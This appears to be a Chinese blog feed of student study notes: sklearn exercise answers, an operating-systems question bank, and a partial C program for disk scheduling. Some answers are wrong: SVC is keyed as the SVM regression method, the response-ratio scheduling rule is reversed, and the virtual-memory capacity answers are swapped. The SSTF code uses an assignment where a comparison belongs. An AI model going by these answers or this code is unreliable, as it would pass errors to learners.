score  D. train_test_split</p><ol start="4"><li>支持向量机用来回归分析的算法是（ B  ）</li></ol><p>A. SVM B. SVC C. SVR D. SVN</p><p>二、填空题</p><ol><li><p>机器学习可以分为监督学习和 无监督学习 。</p></li><li><p>数据预处理的模块是 preprocessing 。</p></li><li><p>函数sklearn .decomposition.PCA(n_components=’mle’,whiten=False,svd_solver=’auto’)中参数n_components取值’mle’用MLE算法根据特征的 方差分布情况  选择一定数量的主成分特征来降维。</p></li></ol><p>三、简答题</p><ol><li>朴素贝叶斯。</li></ol><p>答：朴素贝叶斯是基于贝叶斯定理与特征条件独立假设的分类方法。最为广泛的两种分类模型是决策树模型（Decision Tree Model）和朴素贝叶斯模型（Naive Bayesian Model，NBM）。</p><p>和决策树模型相比，朴素贝叶斯分类器（Naive Bayes Classifier，或NBC）发源于古典数学理论，有着坚实的数学基础，以及稳定的分类效率。同时，NBC模型所需估计的参数很少，对缺失数据不太敏感，算法也比较简单。理论上，NBC模型与其他分类方法相比具有最小的误差率。但是实际上并非总是如此，这是因为NBC模型假设属性之间相互独立，这个假设在实际应用中往往是不成立的，这给NBC模型的正确分类带来了一定影响。</p><ol start="2"><li>模型评估。</li></ol><p>答：</p><p>模型评估是对预测质量的评估，即模型的评价，主要有三种方法。</p><ol><li>模型自带 score函数</li></ol><p>使用model.score(X_test,y_test)可以获得模型的评价，其值为[0,1]之间的数，1表示最好。</p><p>参数X_test表示测试集，参数y_test表示测试集对应的值。</p><ol start="2"><li>cross_val_score </li></ol><p>函数cross_val_score会得到一个对于当前模型的评估得分。在该函数中最主要的参数有两个：scoring和cv。</p><p>scoring参数设定打分的方式，比如accuracy、average_precision等。</p><p>cv参数表示数据划分方式，通常默认的是KFold或者stratifiedKFold方法。</p><p>from sklearn.cross_validation import cross_val_score</p><p>scores = cross_val_score(knn, X, y, scoring=’accuracy’)</p><ol start="3"><li>评估函数</li></ol><p>Sklearn预定义了一些评估函数，这些评估函数也可以用来设置corss_val_score的scoring的值，也可以调函函数名称获取评估值。</p><ol start="3"><li>聚类分析。</li></ol><p>答：</p><p>聚类分析指将物理对象或抽象对象的集合分组为由类似的对象组成的多个类的分析过程。聚类分析的目标就是在相似的基础上收集数据来分类。聚类源于很多领域，包括数学、<a href="https://baike.baidu.com/item/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/9132">计算机科学</a>、统计学、生物学和经济学等。</p><p>聚类与分类的不同在于聚类所要求划分的类是未知的。</p><p>聚类是将<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%88%86%E7%B1%BB">数据分类</a>到不同的类或者簇这样的一个过程，所以同一个簇中的对象有很大的相似性，而不同簇间的对象有很大的相异性。</p><p>从统计学的观点看，聚类分析是通过<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BB%BA%E6%A8%A1">数据建模</a>简化数据的一种方法。传统的统计聚类分析方法包括<a href="https://baike.baidu.com/item/%E7%B3%BB%E7%BB%9F%E8%81%9A%E7%B1%BB">系统聚类</a>法、<a href="https://baike.baidu.com/item/%E5%88%86%E8%A7%A3%E6%B3%95">分解法</a>、加入法、动态聚类法、有序样品聚类、有重叠聚类和模糊聚类等；目前流行的是K-<a href="https://baike.baidu.com/item/%E5%9D%87%E5%80%BC">均值</a>、K-中心点等人工智能的聚类分析算法。</p><p>聚类分析是一种探索性的分析，能够从样本数据出发，自动进行分类。聚类分析所使用方法的不同，常常会得到不同的结论。</p><p>Sklearn实现了多种聚类算法，如表6-6所示。</p><p>表6-6 常用聚类算法</p><table><thead><tr><th>序号</th><th>函数名称</th><th>参数</th><th>距离度量</th></tr></thead><tbody><tr><td>1</td><td>K-Means</td><td>簇数</td><td>点之间距离</td></tr><tr><td>2</td><td>Spectral clustering</td><td>簇数</td><td>图距离</td></tr><tr><td>3</td><td>Ward hierarchical clustering</td><td>簇数</td><td>点之间距离</td></tr><tr><td>4</td><td>Agglomerative clustering</td><td>簇数、连接类型、距离</td><td>任意成对点线图间的距离</td></tr><tr><td>5</td><td>DBSCA</td><td>半径大小、最低成员数目</td><td>最近的点之间的距离</td></tr><tr><td>6</td><td>Birch</td><td>分支因子、阈值、可选全局集群</td><td>点之间的欧式距离</td></tr></tbody></table><blockquote><p>致谢：感谢老王提供的资源 ©老王</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数据分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 习题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统题库</title>
      <link href="/2021/07/06/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%A2%98%E5%BA%93/"/>
      <url>/2021/07/06/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%A2%98%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<ol><li><p>虚拟内存方案为页表项使用了一个特殊的高速缓存，通常称为（ 转换检测缓冲区（TLB） ）。</p></li><li><p>根据操作系统内核是否能感知线程，可以把线程分为两类，其中（ 用户级线程 ）对程序员来说是可见的，而对内核来说却是不可见的。</p></li><li><p>当系统采用资源有序分配的方法预防死锁时，它破坏了死锁的必要条件中的（循环等待 ）条件</p></li><li><p>处理多个中断有两种方法，分别是（ 顺序处理 ）和（嵌套处理  ）；</p></li><li><p>页表项中有一个控制位用来表示当前页是否在内存中，它叫做（  存在位 ），当此控制位未置位时，产生一次内存访问故障，称为（ 缺页中断 ）</p></li><li><p>在最高响应比优先调度算法中，当各个进程的等待时间相同时，( 服务时间长 ) 的进程将优先调度；当各进程的服务时间相同时，( 等待时间长 ) 的进程将优先调度。</p></li><li><p>两级存储器提高性能的理论基础是 （局部性原理 ）  。</p></li><li><p>处理死锁通常有三种方法 （静态预防  ） 、 （动态避免  ）  、 （ 动态检测及解除 ） 。</p></li><li><p>现代操作系统进程管理的基本功能是 （创建 ） 、 （ 管理 ）、 （ 终止 ） 进程。</p></li><li><p>对I/O操作可能的三种技术 （ 程序I/O ）、（中断I/O ）、（ DMA ） 。</p></li><li><p>简述进程切换与模式切换的区别。</p></li></ol><p>模式切换是用户态和内核态之间的切换，因为他们的资源是共享的，所以效率高并且不改变正在运行的进程的状态。<br>进程切换是一个正在运行的进程被中断，操作系统指定另一个进程为运行态，并把控制权交给这个进程。进程切换可以在操作系统从当前正在运行的进程中获得控制权的任何时刻发生，由于进程之间不同状态的切换，需要重新分配各种资源，操作系统需要做更多的工作。</p><p>12.简述DMA概念<br>DMA是直接存储器访问技术，其功能由系统总线中的一个独立模块完成或并入到一个I/O模块。当CPU需要读写一块数据时，它给DMA模块发出一条命令，然后断续处理其他工作。DMA模块直接与存储器交互，此进程无需CPU参与，传送完毕之后，DMA发送中断信号给CPU。</p><ol start="13"><li>请列举两种常用的页面置换算法，并简要说明其算法思想和优缺点。</li></ol><p>最佳置换OPT：选择置换下次访问距当前时间最长的那些页。OPT能导致最少的缺页中断，但是由于它要求操作系统必须知道将来的事件，显然这是不可能实现的。但是它仍然能作为一种标准来衡量其他算法的性能。<br>   先进先出FIFO：置换出驻留在内存中时间最长的页。FIFO是实现起来最简单的置换算法，只需要使用一个循环移动的指针。但是FIFO可能导致一些页会反复的被换入换出。<br>   最近最少使用LRU：置换内存中上次使用距离当前最远的页。LRU的性能接近于OPT。但LRU比较难于实现，而且实现的开销比较大。</p><ol start="14"><li>说明动态分区存储管理中的最佳和首次适配算法的执行过程，以及他们的优缺点。</li></ol><p>最佳适配：选择与要求的大小最接近的空闲块。首次适配：从开始扫描内存，选择大小足够的第一个可用块。首次适配算法不仅是最简单的，而且通常是最快和最好的。但首次适配算法会使得内存的前端出现很多小的空闲分区，并且每当进行首次适配查找时，都要经过这些分区。最佳适配算法尽管称为“最佳”，但通常性能却是最差的。这个算法需要查找满足要求的最小块，因而它可能保证产生的碎片尽可能的小。尽管每次存储请求总是浪费最小的存储空间，但结果却使得内存中很快产生许多很小的块，这些块通常很小以至于不能满足任何内存分配请求。因此，最佳适配算法比其他算法需要更经常的进行内存压缩。</p><ol start="15"><li>什么是进程？为什么要在操作系统中引入进程？</li></ol><p>进程是可并发执行且具有独立功能的程序在一个数据集合上的运行过程，它是操作系统进行资源分配和调度的基本单位。“进程”概念是人们为了使程序能够并发执行，并且能对并发的程序加以描述和控制而引入的。</p><ol start="16"><li>简述什么是临界区？对临界区的互斥访问有哪些要求？ </li></ol><p>对临界区的互斥访问必须满足(1)必须强制实施互斥，即只允许一个进程进入临界区 (2)一个在非临界区停止的进程不能干涉其他进程 (3)绝不允许出现需要访问临界区的进程被无限延迟的情况，即不会死锁或饥饿 (4)当没有进程在临界区中时，任何需要进入临界区的进程必须能够立即进入 (5)对相关进程的执行速度和处理器的数目没有任何要求和限制 (6)一个进程驻留在临界区中的时间必须是有限的。<br> 使用临界资源的那一部分程序称为临界区。</p><ol start="17"><li>处理器调度的层次有哪些？各层次的主要工作是什么？</li></ol><p>（2）中级调度：内存和外存之间的交换。系统内存使用紧张时，把内存中暂时不能运行的进程调到外存中等待，等内存有足够的空闲空间时，再将外存上的某些具备了运行条件的就绪进程调入内存<br>（1）高级调度：从驻留在外存后备队列中选择一个或多个作业调入内存，创建进程并放入就绪队列中，等待被调度执行。<br>（3）低级调度：按照一定的算法从就绪队列中选择一个进程，然后将处理器分配给它。<br>处理器调度的层次分为三级调度：高级调度、中级调度和低级调度。</p><ol start="18"><li><p>一个计算机系统的虚拟存储器，其最大容量和实际容量分别由什么决定？<br>虚拟存储器的实际容量由指令中表示地址的字长决定，也就是计算机的地址结构决定的。<br>虚拟存储器的最大容量由主存和辅存的容量之和确定。</p></li><li><p>什么是内部碎片和外部碎片？固定分区分配、可变分区分配、分段存储管理和分页存储管理可能产生何种碎片？<br>内碎片：在一个分区或页的内部出现的碎片(即被浪费的空间)。外碎片：在所有分区之外新增的碎片称作外部碎片。固定分区分配、分页存储管理可能产生内碎片。可变分区分配、分段存储管理可能产生外碎片</p></li><li><p>请简述FCFS (先来先服务)、RR (轮转)、SPN (最短进程优先)进程调度算法的算法思想。</p></li></ol><p>(3)最短进程优先 SPN：选择预计处理时间最短的进程运行。<br>轮转RR：以一个时间间隔（时间片）产生时钟中断，当时钟中断发生时，当前正在运行的进程被置于就绪队列中，然后基于FCFS策略选择下一个就绪进程运行。<br>先来先服务FCFS：选择在就绪队列中存在时间最长的进程执行。</p><ol start="21"><li>简述进程控制块的内容。</li></ol><p>进程控制块中包含标识符、状态、优先级、程序计数器、内存指针、上下文数据、I/O状态信息、记账信息。</p><ol start="22"><li>semWait操作和semSignal操作是如何定义的？简述当进程调用了semWait和semSignal后，它自身的进程状态的改变情况。</li></ol><p>semWait操作：信号量减1，若值为负数，则执行semWait的进程被阻塞。否则进程继续执行。semSignal操作：信号量加1，若值小于或等于零，则被semWait操作阻塞的进程被解除阻塞。当进程调用了semWait，它自身的进程状态可能不改变，或由运行态变为阻塞态。当进程调用了semSignal，它自身的状态不变。</p><ol start="23"><li>某杂技团进行走钢丝表演。在钢丝的A、B两端各有n名演员（n&gt;1）在等待表演。只要钢丝上无人时便允许一名演员从钢丝的一端走到另一端。现要求两端的演员交替地走钢丝，且从A端的一名演员先开始。请问，把A、B两端的演员各看作一个进程时，怎样用semWait操作和semSignal操作（PV操作）来进行控制？设置几个信号量，分别用于控制什么，信号量的初值是多少？请写出能进行正确管理的程序。</li></ol><p>（参考答案说明：信号量的命名可以任意）设置2个信号量S1、S2。S1用于A端演员是否可以走钢丝，由于A端演员先走，S1初值为1。S2用于B端演员是否可以走钢丝，由于B端演员后走，S2初值为0.。<br>A端：           B端：<br>semSignal(S2)       semSignal(S1)<br>semWait(S1)        semWait(S2)<br>走钢丝          走钢丝</p><ol start="24"><li><p>简述进程与线程的概念。<br>进程是具有独立功能的程序在某个数据集合上的一次执行过程。进程是系统进行资源分配和调度的一个独立单位。在现代操作系统中，资源申请的基本单位是进程，进程由程序段、数据段和PCB（进程控制块）组成。线程是进程内的一个执行实体或执行单元，是比进程更小的能独立运行的基本单位。</p></li><li><p>简述文件及文件组织的概念。</p></li></ol><p>文件组织:堆、顺序文件、索引顺序文件、索引文件、直接或散列文件。<br>文件是一组相似记录的集合，它被用户和应用程序看做一个实体，可以通过名字访问。</p><p>26.简述抢占式处理器调度和非抢占式处理器调度。</p><p>抢占式处理器调度：当前正在运行的进程可能被操作系统中断并转移至就绪态，它可能会导致较大的开销，但对所有的进程会提供较好的服务。<br>非抢占式处理器调度：一旦进程开始运行，就不间断执行直到终止，或者为等待I/O或请求某些系统服务而阻塞自己。</p><ol start="27"><li>简述在使用TLB的请求式分页内存管理方案中一次指令访问过程。</li></ol><p>首先进行逻辑地址转换为页号与页内偏移，根据页号查找TLB中的页表项，如果命中，则进行地址重定位；如果TLB没有命中，则在内存中查找页表，如果当前页在内存，则将此页表项添加到TLB，并将页帧号与页内偏移拼接形成物理地址，如果当前页不在内存，则产生缺页中断，将所缺页调入内存之后，再进行地址重定位。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> 习题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>磁盘调度算法的设计与实现</title>
      <link href="/2021/07/01/%E7%A3%81%E7%9B%98%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
      <url>/2021/07/01/%E7%A3%81%E7%9B%98%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>操作系统课设的收尾</p><h3 id="实现源码"><a href="#实现源码" class="headerlink" title="实现源码"></a>实现源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&quot;stdlib.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> maxsize 1000 <span class="hljs-comment">//定义最大数组域</span></span><br><span class="hljs-comment">//先进先出调度算法</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">FIFO</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[],<span class="hljs-keyword">int</span> m)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> sum=<span class="hljs-number">0</span>,j,i,now;<br>    <span class="hljs-keyword">float</span> avg;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n 请输入当前的磁道号： &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;now);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n FIFO 调度结果: &quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,now);<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;m; i++) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,<span class="hljs-built_in">array</span>[i]);<br>    sum=<span class="hljs-built_in">abs</span>(now-<span class="hljs-built_in">array</span>[<span class="hljs-number">0</span>]);<br>    <span class="hljs-keyword">for</span>(j=<span class="hljs-number">1</span>; j&lt;m; j++) sum+=<span class="hljs-built_in">abs</span>(<span class="hljs-built_in">array</span>[j]-<span class="hljs-built_in">array</span>[j<span class="hljs-number">-1</span>]); <span class="hljs-comment">//累计总的移动距离</span><br>    avg=(<span class="hljs-keyword">float</span>)sum/m;<span class="hljs-comment">//计算平均寻道长度</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n 移动的总道数： %d \n&quot;</span>,sum);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; 平均寻道长度： %f \n&quot;</span>,avg);<br>&#125;<br><span class="hljs-comment">//最短服务时间优先调度算法</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SSTF</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[],<span class="hljs-keyword">int</span> m)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> temp;<br>    <span class="hljs-keyword">int</span> k=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">int</span> now,l,r;<br>    <span class="hljs-keyword">int</span> i,j,sum=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">float</span> avg;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;m; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(j=i+<span class="hljs-number">1</span>; j&lt;m; j++) <span class="hljs-comment">//对磁道号进行从小到大排列</span><br>        &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">array</span>[i]&gt;<span class="hljs-built_in">array</span>[j])<span class="hljs-comment">//两磁道号之间比较</span><br>            &#123;<br>                temp=<span class="hljs-built_in">array</span>[i];<br>                <span class="hljs-built_in">array</span>[i]=<span class="hljs-built_in">array</span>[j];<br>                <span class="hljs-built_in">array</span>[j]=temp;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span>( i=<span class="hljs-number">0</span>; i&lt;m; i++) <span class="hljs-comment">//输出排序后的磁道号数组</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,<span class="hljs-built_in">array</span>[i]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n 请输入当前的磁道号： &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;now);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n SSTF 调度结果: &quot;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">array</span>[m<span class="hljs-number">-1</span>]&lt;=now)<span class="hljs-comment">//判断整个数组里的数是否都小于当前磁道号</span><br>    &#123;<br>        <span class="hljs-keyword">for</span>(i=m<span class="hljs-number">-1</span>; i&gt;=<span class="hljs-number">0</span>; i--) <span class="hljs-comment">//将数组磁道号从大到小输出</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,<span class="hljs-built_in">array</span>[i]);<br>        sum=now-<span class="hljs-built_in">array</span>[<span class="hljs-number">0</span>];<span class="hljs-comment">//计算移动距离</span><br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">array</span>[<span class="hljs-number">0</span>]&gt;=now)<span class="hljs-comment">//判断整个数组里的数是否都大于当前磁道号</span><br>    &#123;<br>        <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;m; i++) <span class="hljs-comment">//将磁道号从小到大输出</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,<span class="hljs-built_in">array</span>[i]);<br>        sum=<span class="hljs-built_in">array</span>[m<span class="hljs-number">-1</span>]-now;<span class="hljs-comment">//计算移动距离</span><br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-built_in">array</span>[k]&lt;now)<span class="hljs-comment">//逐一比较以确定 K 值</span><br>        &#123;<br>            k++;<br>        &#125;<br>        l=k<span class="hljs-number">-1</span>;<br>        r=k;<br><span class="hljs-comment">//确定当前磁道在已排的序列中的位置</span><br>        <span class="hljs-keyword">while</span>((l&gt;=<span class="hljs-number">0</span>)&amp;&amp;(r&lt;m))<br>        &#123;<br>            <span class="hljs-keyword">if</span>((now-<span class="hljs-built_in">array</span>[l])&lt;=(<span class="hljs-built_in">array</span>[r]-now))<span class="hljs-comment">//判断最短距离</span><br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,<span class="hljs-built_in">array</span>[l]);<br>                sum+=now-<span class="hljs-built_in">array</span>[l];<span class="hljs-comment">//计算移动距离</span><br>                now=<span class="hljs-built_in">array</span>[l];<br>                l=l<span class="hljs-number">-1</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,<span class="hljs-built_in">array</span>[r]);<br>                sum+=<span class="hljs-built_in">array</span>[r]-now;<span class="hljs-comment">//计算移动距离</span><br>                now=<span class="hljs-built_in">array</span>[r];<br>                r=r+<span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(l=<span class="hljs-number">-1</span>)<br>        &#123;<br>            <span class="hljs-keyword">for</span>(j=r; j&lt;m; j++)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,<span class="hljs-built_in">array</span>[j]);<br>            &#125;<br>            sum+=<span class="hljs-built_in">array</span>[m<span class="hljs-number">-1</span>]-<span class="hljs-built_in">array</span>[<span class="hljs-number">0</span>];<span class="hljs-comment">//计算移动距离</span><br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">for</span>(j=l; j&gt;=<span class="hljs-number">0</span>; j--)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,<span class="hljs-built_in">array</span>[j]);<br>            &#125;<br>            sum+=<span class="hljs-built_in">array</span>[m<span class="hljs-number">-1</span>]-<span class="hljs-built_in">array</span>[<span class="hljs-number">0</span>];<span class="hljs-comment">//计算移动距离</span><br>        &#125;<br>    &#125;<br>    avg=(<span class="hljs-keyword">float</span>)sum/m;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n 移动的总道数： %d \n&quot;</span>,sum);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; 平均寻道长度： %f \n&quot;</span>,avg);<br>&#125;<br><span class="hljs-comment">///扫描算法</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SCAN</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[],<span class="hljs-keyword">int</span> m)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> sum=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;m; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=i+<span class="hljs-number">1</span>; j&lt;m; j++) <span class="hljs-comment">//对磁道号进行从小到大排列</span><br>        &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">array</span>[i]&gt;<span class="hljs-built_in">array</span>[j])<span class="hljs-comment">//两磁道号之间比较</span><br>            &#123;<br>                <span class="hljs-keyword">int</span> temp=<span class="hljs-built_in">array</span>[i];<br>                <span class="hljs-built_in">array</span>[i]=<span class="hljs-built_in">array</span>[j];<br>                <span class="hljs-built_in">array</span>[j]=temp;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;m; i++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,<span class="hljs-built_in">array</span>[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n 请输入当前的磁道号： &quot;</span>);<br>    